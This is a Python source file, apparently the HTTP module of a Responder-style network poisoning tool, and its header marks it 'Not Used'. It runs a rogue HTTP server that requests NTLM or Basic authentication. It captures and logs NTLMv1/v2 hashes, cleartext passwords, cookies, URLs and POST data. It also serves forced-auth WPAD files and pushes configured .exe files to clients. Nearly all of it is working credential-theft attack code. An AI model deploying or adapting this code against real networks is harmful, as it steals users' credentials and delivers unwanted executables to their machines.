##################################################################################
#HTTP Proxy Stuff starts here (Not Used)
##################################################################################

class HTTPProxy():

	def serve_thread_tcp(host, port, handler):
		try:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	def start(on_off):
		if on_off == "ON":
			t = threading.Thread(name="HTTP", target=self.serve_thread_tcp, args=("0.0.0.0", 80,HTTP))
			t.setDaemon(True)
			t.start()

		if on_off == "OFF":
			return False

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

#Parse NTLMv1/v2 hash.
def ParseHTTPHash(data,client):
	LMhashLen = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	if NthashLen == 24:
		NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		HostNameLen = struct.unpack('<H',data[46:48])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/HTTP-NTLMv1-Client-"+client+".txt"
		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
		WriteData(outfile,WriteHash, User+"::"+Hostname)
		responder_logger.info('[+]HTTP NTLMv1 hash captured from :%s'%(client))
		responder_logger.info('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
		responder_logger.info('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
		responder_logger.info('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))

	if NthashLen > 24:
		NthashLen = 64
		DomainLen = struct.unpack('<H',data[28:30])[0]
		DomainOffset = struct.unpack('<H',data[32:34])[0]
		Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		HostNameLen = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		outfile = "./logs/responder/HTTP-NTLMv2-Client-"+client+".txt"
		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
		WriteData(outfile,WriteHash, User+"::"+Domain)
		responder_logger.info('[+]HTTP NTLMv2 hash captured from :%s'%(client))
		responder_logger.info('[+]HTTP NTLMv2 User is : %s'%(User))
		responder_logger.info('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
		responder_logger.info('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
		responder_logger.info('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))

def GrabCookie(data,host):
	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
	if Cookie:
		CookieStr = "[+]HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
		responder_logger.info(CookieStr)
		return Cookie.group(0)
	else:
		NoCookies = "No cookies were sent with this request"
		responder_logger.info(NoCookies)
		return NoCookies

def WpadCustom(data,client):
	Wpad = re.search('(/wpad.dat|/*\.pac)', data)
	if Wpad:
		buffer1 = WPADScript(Payload=WPAD_Script)
		buffer1.calculate()
		return str(buffer1)
	else:
		return False

def WpadForcedAuth(Force_WPAD_Auth):
	if Force_WPAD_Auth == True:
		return True
	if Force_WPAD_Auth == False:
		return False

# Function used to check if we answer with a Basic or NTLM auth.
def Basic_Ntlm(Basic):
	if Basic == True:
		return IIS_Basic_401_Ans()
	else:
		return IIS_Auth_401_Ans()

def ServeEXE(data,client, Filename):
	Message = "[+]Sent %s file sent to: %s."%(Filename,client)
	responder_logger.info(Message)
	with open (Filename, "rb") as bk:
		data = bk.read()
		bk.close()
		return data

def ServeEXEOrNot(on_off):
	if Exe_On_Off == "ON":
		return True
	if Exe_On_Off == "OFF":
		return False

def ServeEXECAlwaysOrNot(on_off):
	if Exec_Mode_On_Off == "ON":
		return True
	if Exec_Mode_On_Off == "OFF":
		return False

def IsExecutable(Filename):
	exe = re.findall('.exe',Filename)
	if exe:
		return True
	else:
		return False

def GrabURL(data, host):
	GET = re.findall('(?<=GET )[^HTTP]*', data)
	POST = re.findall('(?<=POST )[^HTTP]*', data)
	POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
	if GET:
		HostStr = "[+]HTTP GET request from : %s. The HTTP URL requested was: %s"%(host, ''.join(GET))
		responder_logger.info(HostStr)
		#print HostStr

	if POST:
		Host3Str = "[+]HTTP POST request from : %s. The HTTP URL requested was: %s"%(host,''.join(POST))
		responder_logger.info(Host3Str)
		#print Host3Str
		if len(''.join(POSTDATA)) >2:
			PostData = '[+]The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA).strip())
			#print PostData
			responder_logger.info(PostData)

#Handle HTTP packet sequence.
def PacketSequence(data,client):
	Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
	BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)

	if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
		File = config.get('HTTP Server', 'ExecFilename')
		buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
		buffer1.calculate()
		return str(buffer1)

	if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
		if IsExecutable(FILENAME):
			buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
			buffer1.calculate()
			return str(buffer1)
		else:
			buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
			buffer1.calculate()
			return str(buffer1)

	if Ntlm:
		packetNtlm = b64decode(''.join(Ntlm))[8:9]
		if packetNtlm == "\x01":
			GrabURL(data,client)
			GrabCookie(data,client)
			r = NTLM_Challenge(ServerChallenge=Challenge)
			r.calculate()
			t = IIS_NTLM_Challenge_Ans()
			t.calculate(str(r))
			buffer1 = str(t)
			return buffer1
		if packetNtlm == "\x03":
			NTLM_Auth= b64decode(''.join(Ntlm))
			ParseHTTPHash(NTLM_Auth,client)
			if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
				Message = "[+]WPAD (auth) file sent to: %s"%(client)
				if Verbose:
					print Message
				responder_logger.info(Message)
				buffer1 = WpadCustom(data,client)
				return buffer1
			else:
				buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
				buffer1.calculate()
				return str(buffer1)

	if BasicAuth:
		GrabCookie(data,client)
		GrabURL(data,client)
		outfile = "./logs/responder/HTTP-Clear-Text-Password-"+client+".txt"
		WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
		responder_logger.info('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
		if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
			Message = "[+]WPAD (auth) file sent to: %s"%(client)
			if Verbose:
				print Message
			responder_logger.info(Message)
			buffer1 = WpadCustom(data,client)
			return buffer1
		else:
			buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
			buffer1.calculate()
			return str(buffer1)

	else:
		return str(Basic_Ntlm(Basic))

#HTTP Server Class
class HTTP(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				self.request.settimeout(1)
				data = self.request.recv(8092)
				buff = WpadCustom(data,self.client_address[0])
				if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
					Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
					if Verbose:
						print Message
					responder_logger.info(Message)
					self.request.send(buff)
				else:
					buffer0 = PacketSequence(data,self.client_address[0])
					self.request.send(buffer0)
		except Exception:
			pass#No need to be verbose..
			